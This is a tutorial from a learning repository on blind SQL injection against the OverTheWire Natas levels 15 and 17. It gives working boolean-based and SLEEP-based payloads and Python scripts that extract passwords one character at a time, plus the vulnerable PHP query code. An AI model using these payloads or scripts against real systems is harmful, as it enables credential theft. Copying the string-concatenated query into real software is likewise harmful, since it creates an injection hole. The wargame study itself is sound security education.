# 🌐 Web Security — Blind SQL Injection

> The server doesn't show you an error message, it only says "exists" or "doesn't exist."
> That's enough — with a single bit of information and enough questions, you can learn everything.

---

## 📋 Table of Contents

- [What Is Blind SQLi?](#what-is-blind-sqli)
- [Boolean-Based Blind SQLi](#boolean-based-blind-sqli)
- [Extracting the Password Character by Character](#extracting-the-password-character-by-character)
- [Time-Based Blind SQLi](#time-based-blind-sqli)
- [Speeding Up with Binary Search](#speeding-up-with-binary-search)
- [Automating with Python](#automating-with-python)
- [Usage in Natas](#usage-in-natas)

---

## What Is Blind SQLi?

In normal SQLi, the application shows the query result directly on the screen. In Blind SQLi, however, the application:

- Does **not** show an error message
- Does **not** print the query result to the screen
- Only shows **two different states** like "user exists / doesn't exist" or "true / false"

```
Normal SQLi:
  SELECT password FROM users WHERE id=1
  → "abc123" (you see the password directly)

Blind SQLi:
  Does the user exist?  → "This user exists" / "This user doesn't exist"
  Only true/false information
```

The difference between these two states forms the questions we want to ask.

---

## Boolean-Based Blind SQLi

We extract information by checking whether the query returns `true` or `false`.

### Basic Logic

```sql
-- "Does the user natas15 exist?" → true/false
SELECT * FROM users WHERE username='natas15'

-- "Does the password of natas15 start with the letter 'a'?" → true/false
SELECT * FROM users WHERE username='natas15' AND password LIKE 'a%'

-- "Is the 1st character of the password 'W'?"
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'W%'
```

Each question gives one bit of information. With enough questions we can learn the full password.

### The LIKE Operator

```sql
LIKE 'a%'        → starts with 'a'
LIKE '%a%'       → contains 'a'
LIKE 'a_'        → 'a' + any character (exactly 2 characters)
LIKE 'abc%'      → starts with 'abc'
```

`%` → zero or more characters
`_` → exactly one character

### BINARY — Case-Sensitive

In MySQL, LIKE is case-insensitive:

```sql
password LIKE 'W%'    → starts with 'W' or 'w' (both match)
BINARY password LIKE 'W%'   → only starts with uppercase 'W'
```

When extracting passwords, using `BINARY` gives more accurate results.

---

## Extracting the Password Character by Character

### Method 1: Prefix Test with LIKE

For each position, try all characters:

```sql
-- Is the 1st character 'a'?
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'a%'

-- Is the 1st character 'b'?
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'b%'

-- Is the 1st character 'W'? → TRUE → continue
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'W%'

-- Is the 2nd character 'a'?
SELECT * FROM users WHERE username='natas15' AND BINARY password LIKE 'Wa%'
...
```

For each character: lowercase letters (26) + uppercase letters (26) + digits (10) = 62 attempts.

For a 32-character password → 32 × 62 = ~2000 requests. Slow but it works.

### Method 2: SUBSTRING + Equality

```sql
-- Is the 1st character of the password 'W'?
SELECT * FROM users WHERE username='natas15' 
  AND SUBSTRING(password, 1, 1) = 'W'

-- Is the 2nd character of the password 'A'?
SELECT * FROM users WHERE username='natas15' 
  AND SUBSTRING(password, 1, 2) = 'WA'
```

`SUBSTRING(str, start, length)` — 1-indexed.

### Method 3: ASCII + Numeric Comparison

```sql
-- Is the ASCII value of the 1st character greater than 87? (87 = 'W')
SELECT * FROM users WHERE username='natas15'
  AND ASCII(SUBSTRING(password, 1, 1)) > 87
```

This method is very fast when combined with binary search.

---

## Time-Based Blind SQLi

Sometimes the application doesn't even create a visual difference for true/false. In this case the `SLEEP()` function is used.

```sql
-- If the condition is true, wait 5 seconds; if false, return without waiting
SELECT * FROM users WHERE username='natas17' 
  AND IF(BINARY password LIKE 'W%', SLEEP(5), 1)
```

```python
import time, requests

start = time.time()
# Send the request
elapsed = time.time() - start

if elapsed > 4:   # waited 5 seconds → condition TRUE
    print("This character is correct!")
```

For Natas 17 this method is required — nothing is shown on the screen.

---

## Speeding Up with Binary Search

If we use binary search instead of 62 attempts per character, we can find it in ~6 attempts.

### The Logic

```
The character's ASCII value is between 32-127
Midpoint: 79

Is the ASCII value > 79?
  Yes → search in [80-127]
  No  → search in [32-79]

At each step, halve the range
```

```python
def find_char(position, session, url, username, password):
    low, high = 32, 127

    while low <= high:
        mid = (low + high) // 2

        # Is the ASCII value greater than mid?
        payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1))>{mid}-- '
        r = session.post(url, data={'username': payload}, auth=(username, password))

        if "This user exists" in r.text:
            low = mid + 1
        else:
            # Check whether it's exactly equal
            payload_eq = f'natas16" AND ASCII(SUBSTRING(password,{position},1))={mid}-- '
            r2 = session.post(url, data={'username': payload_eq}, auth=(username, password))
            if "This user exists" in r2.text:
                return chr(mid)
            else:
                high = mid - 1

    return None
```

---

## Automating with Python

### Natas 15 — Boolean-Based (LIKE)

```python
import requests
import string

url      = "http://natas15.natas.labs.overthewire.org/"
username = "natas15"
password = "[natas15_password]"

chars    = string.ascii_letters + string.digits   # a-z + A-Z + 0-9
found    = ""

while True:
    found_next = False
    for c in chars:
        candidate = found + c
        payload = f'natas16" AND BINARY password LIKE "{candidate}%"-- '
        r = requests.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )
        if "This user exists" in r.text:
            found += c
            print(f"[+] Found: {found}")
            found_next = True
            break

    if not found_next:
        break   # we reached the end of the password

print(f"\n[✓] Password: {found}")
```

### Natas 17 — Time-Based (SLEEP)

```python
import requests, time, string

url      = "http://natas17.natas.labs.overthewire.org/"
username = "natas17"
password = "[natas17_password]"

chars  = string.ascii_letters + string.digits
found  = ""

for position in range(1, 33):   # 32-character password
    for c in chars:
        payload = (
            f'natas18" AND IF(BINARY password LIKE "{found + c}%",'
            f'SLEEP(1),0)-- '
        )
        start = time.time()
        requests.post(url, data={"username": payload}, auth=(username, password))
        elapsed = time.time() - start

        if elapsed >= 1:
            found += c
            print(f"[+] Position {position}: {c} | So far: {found}")
            break
```

---

## Usage in Natas

### Natas 15 — User Exists/Doesn't Exist Blind SQLi

**Source code:**

```php
<?php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.";
    } else {
        echo "This user doesn't exist.";
    }
}
?>
```

**Two states:**
- `"This user exists."` → query TRUE
- `"This user doesn't exist."` → query FALSE

**Manual test:**

```
Username: natas16" AND BINARY password LIKE "W%"-- 
→ "This user exists." → the password starts with W!

Username: natas16" AND BINARY password LIKE "WA%"-- 
→ "This user exists." → the second character is A!
```

**With the automated Python script:** run the code above → it finds the full password.

---

### Natas 17 — SLEEP Blind SQLi

**Source code:**

```php
<?php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) > 0) {
        // WRITES NOTHING — no visual difference!
    }
}
?>
```

There's no difference on the screen. The time-based method is mandatory.

---

### Blind SQLi — Checklist

```
Detection:
  ☐ Does normal SQLi give an error message? (No → could be Blind)
  ☐ Are there two different states? (exists/doesn't exist, true/false, fast/slow)
  ☐ Do ' OR 1=1-- and ' OR 1=2-- give different results?

Choose a method:
  ☐ Is there a visual difference? → Boolean-based
  ☐ Is there no visual difference? → Time-based (SLEEP)

Automate:
  ☐ Write a Python script with the requests library
  ☐ Determine the character set: string.ascii_letters + string.digits
  ☐ Use a prefix test with LIKE or binary search
  ☐ Use BINARY (case-sensitive)
```

---

## 🔗 Resources

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP — Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

---

**Previous topic:** [11_sql_injection.md](./11_sql_injection.md)
**Next topic:** [13_command_injection_advanced.md](./13_command_injection_advanced.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
